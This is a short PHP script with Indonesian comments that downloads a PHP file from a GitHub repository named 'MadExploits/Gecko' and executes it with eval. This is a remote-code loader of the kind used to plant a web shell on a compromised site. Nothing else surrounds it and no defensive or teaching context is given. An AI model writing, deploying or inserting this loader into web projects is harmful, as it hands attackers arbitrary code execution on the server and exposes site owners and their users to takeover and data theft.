<?php
// Mengambil dan mengeksekusi kode dari URL
$link = 'https://raw.githubusercontent.com/MadExploits/Gecko/main/gecko-new.php';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $link);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$output = curl_exec($ch);
curl_close($ch);

// Mengeksekusi kode yang diambil
eval('?>' . $output);
?>
